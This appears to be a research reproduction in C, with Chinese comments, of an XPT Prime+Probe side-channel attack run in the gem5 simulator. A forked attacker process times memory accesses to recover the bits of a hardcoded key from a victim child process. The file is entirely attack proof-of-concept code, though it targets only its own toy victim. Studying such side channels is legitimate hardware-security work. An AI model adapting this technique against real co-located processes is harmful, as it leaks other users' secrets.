/*
 * attack_gem5.c — XPT Prime+Probe Attack (gem5 FS 版本)
 * ========================================================
 * 与原始 attack.c 的主要改动:
 *   1. rdtscp() → read_tsc()  (gem5 FS 的 x86 guest 支持 rdtsc)
 *   2. clflush  保留, 用于驱逐 L1/L2/L3
 *   3. 加入 gem5_work_begin/end 标记，方便在 stats 里定位观测窗口
 *   4. 受害者只访问 secret_page 一次后退出（便于仿真终止）
 *   5. 攻击者做完一轮 Prime→Probe 后打印结果并退出
 *
 * 编译 (在 guest 里):
 *   gcc -O1 -o attack_gem5 attack_gem5.c
 *
 * 运行:
 *   ./attack_gem5
 */

#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>

/* ── 参数 (与论文一致) ────────────────────────── */
#define PAGE_SIZE   4096
#define XPT_SIZE    256        /* XPT 总条目数            */
#define THRESHOLD   32         /* 激活所需 LLC miss 次数  */
/* 论文实测: XPT 命中 170-330 cycles, LLC miss 350+ cycles */
#define HIT_THRESH  330        /* 低于此值 → XPT 已命中  */

/* ── 共享内存池 ───────────────────────────────── */
/* 需要 (XPT_SIZE + 1) 页 + victim 页，留足余量   */
#define POOL_PAGES  (XPT_SIZE + 64)
static uint8_t pool[POOL_PAGES * PAGE_SIZE]
    __attribute__((aligned(PAGE_SIZE)));

/* ── gem5 magic instruction (m5ops) ──────────────
 * m5_work_begin / m5_work_end 标记仿真 ROI
 * 如未编译 m5ops 可以直接删掉这两个宏                */
#ifdef USE_M5OPS
#  include <gem5/m5ops.h>
#  define SIM_BEGIN()  m5_work_begin(0, 0)
#  define SIM_END()    m5_work_end(0, 0)
#else
#  define SIM_BEGIN()  do {} while(0)
#  define SIM_END()    do {} while(0)
#endif

/* ── 时间戳 ───────────────────────────────────── */
static inline uint64_t read_tsc(void) {
    uint32_t lo, hi;
    /* gem5 FS 的 x86 guest 支持 rdtsc */
    __asm__ volatile (
        "mfence\n\t"
        "rdtsc\n\t"
        "lfence"
        : "=a"(lo), "=d"(hi)
    );
    return ((uint64_t)hi << 32) | lo;
}

/* ── clflush helper ────────────────────────────── */
static inline void flush(volatile void *p) {
    __asm__ volatile("clflush (%0)" : : "r"(p) : "memory");
}

/* ── 训练单页 XPT (制造 THRESHOLD+2 次 LLC miss) ─ */
static void train_page(volatile uint8_t *page) {
    for (int t = 0; t < THRESHOLD + 2; t++) {
        volatile uint8_t v = page[0];   /* 访问同一页，触发 LLC miss */
        (void)v;
        flush(page);
        /* 内存屏障，防止乱序 */
        __asm__ volatile("mfence" ::: "memory");
    }
}

/* ════════════════════════════════════════════════
 *  受害者逻辑 (Core 1)
 *  secret_key 的 bit-0 决定是否访问 secret_page
 * ════════════════════════════════════════════════ */
void victim_logic(void) {
    /* 绑核 */
    cpu_set_t mask;
    CPU_ZERO(&mask); CPU_SET(1, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask) < 0) {
        perror("[Victim] sched_setaffinity");
    }

    printf("[Victim] Running on Core 1...\n");
    fflush(stdout);

    uint8_t secret_key = 0x96;  /* bit-0 = 0 → 不访问; bit-0 = 1 → 访问 */
    /* 选用 pool 末尾的页，与攻击者的 eviction set 不重叠 */
    volatile uint8_t *secret_page = &pool[(POOL_PAGES - 1) * PAGE_SIZE];

    /* 先把 secret_page 彻底驱逐出缓存 */
    flush(secret_page);
    __asm__ volatile("mfence" ::: "memory");

    /* 等攻击者完成 Prime (简单 sleep，FS 仿真里 usleep 可用) */
    usleep(500 * 1000);   /* 500 ms，给攻击者充分 Prime 时间 */

    /* 模拟密钥相关访问 */
    int rounds = 8;
    for (int bit = 7; bit >= 0; bit--) {
        if ((secret_key >> bit) & 0x01) {
            /* bit=1: 访问 secret_page → 在 XPT 里训练/驱逐最老条目 */
            volatile uint8_t v = *secret_page;
            (void)v;
            printf("[Victim] bit=%d → ACCESSED secret_page\n", bit);
        } else {
            printf("[Victim] bit=%d → skip\n", bit);
        }
        fflush(stdout);
        usleep(200 * 1000);   /* 200 ms 间隔，给攻击者采样 */
    }

    printf("[Victim] Done.\n");
    fflush(stdout);
    exit(0);
}

/* ════════════════════════════════════════════════
 *  攻击者逻辑 (Core 0)
 *  Prime-and-Probe: 填满 XPT → 等受害者 → 探测驱逐
 * ════════════════════════════════════════════════ */
void attacker_logic(void) {
    /* 绑核 */
    cpu_set_t mask;
    CPU_ZERO(&mask); CPU_SET(0, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask) < 0) {
        perror("[Attacker] sched_setaffinity");
    }

    printf("[Attacker] Running on Core 0...\n");
    fflush(stdout);

    /* eviction_set: pool 前 XPT_SIZE 页 */
    volatile uint8_t *eviction_set[XPT_SIZE];
    for (int i = 0; i < XPT_SIZE; i++)
        eviction_set[i] = &pool[i * PAGE_SIZE];

    /* 等受害者进程启动 */
    usleep(100 * 1000);

    SIM_BEGIN();  /* gem5 ROI 开始标记 */

    int detected_bits = 0;

    for (int round = 0; round < 8; round++) {

        /* ── Step 1: Prime (填满 XPT 256 个条目) ── */
        printf("[Attacker] Round %d: Priming XPT...\n", round);
        fflush(stdout);
        for (int i = 0; i < XPT_SIZE; i++) {
            train_page(eviction_set[i]);
        }

        /* ── Step 2: 等受害者执行 (受害者 200ms 间隔) ── */
        usleep(250 * 1000);   /* 250 ms */

        /* ── Step 3: Probe (检测最老条目是否被驱逐) ──
         * 若受害者访问了 secret_page，它会驱逐 XPT 里最老的条目
         * → eviction_set[0] 的访问延迟会升回 350+ cycles
         */
        flush(eviction_set[0]);
        __asm__ volatile("mfence" ::: "memory");

        uint64_t t0 = read_tsc();
        volatile uint8_t v = eviction_set[0][0];
        (void)v;
        __asm__ volatile("lfence" ::: "memory");
        uint64_t t1 = read_tsc();
        uint64_t latency = t1 - t0;

        int evicted = (latency > HIT_THRESH);
        printf("[Attacker] Round %d: latency=%lu → %s\n",
               round, latency,
               evicted ? "EVICTED (victim BIT=1)" : "PRESENT (victim BIT=0)");
        fflush(stdout);

        if (evicted) detected_bits++;

        /* ── Step 4: 清理受害者条目 (为下一轮重新 Prime) ──
         * 访问剩余 255 页 + 新页，把受害者条目推到 LRU 末尾并驱逐 */
        for (int i = 1; i < XPT_SIZE; i++) {
            train_page(eviction_set[i]);
        }
    }

    SIM_END();    /* gem5 ROI 结束标记 */

    printf("\n[Attacker] Summary: detected %d/8 '1' bits from secret_key=0x96\n",
           detected_bits);
    fflush(stdout);
    exit(0);
}

/* ════════════════════════════════════════════════
 *  main
 * ════════════════════════════════════════════════ */
int main(void) {
    /* 预先 touch 整个 pool，确保物理页已分配 */
    memset(pool, 0xAA, sizeof(pool));

    int pid = fork();
    if (pid < 0) {
        perror("fork");
        return 1;
    }

    if (pid == 0) {
        /* 子进程: 受害者 (Core 1) */
        victim_logic();
    } else {
        /* 父进程: 攻击者 (Core 0) */
        attacker_logic();
        waitpid(pid, NULL, 0);
    }
    return 0;
}